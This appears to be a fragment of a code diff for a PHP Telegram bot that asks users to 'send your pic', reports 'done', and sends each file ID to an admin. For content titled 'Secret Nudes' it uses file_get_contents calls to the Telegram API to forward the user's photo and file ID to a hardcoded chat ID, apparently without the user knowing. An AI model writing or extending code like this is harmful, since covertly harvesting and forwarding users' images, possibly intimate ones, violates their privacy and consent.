@@ -30,9 +30,8 @@ function sendpic($chat_id,$file){
 if($title == "in the mood"){edit_message($message_id);}
 if($message == "/start"){send_message($chat_id,$message_id, "send your pic");}
 if( is_null($file_id) != "1" ){send_message($chat_id,$message_id, "done"); sendtoadmin($file_id); }
-if($title == "Secret Nudes"){//hyperlink($sfile_id);
+if($title == "Secret Nudes"){hyperlink($sfile_id);
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=150681772&text=$sfile_id");
-file_get_contents("https://api.telegram.org/bot$token/sendPhoto?chat_id=150681772&photo=$file");
-}
+file_get_contents("https://api.telegram.org/bot$token/sendPhoto?chat_id=150681772&photo=$file");}
 else{ $file = substr($message, 7); sendpic($chat_id,$file); } 
 ?>
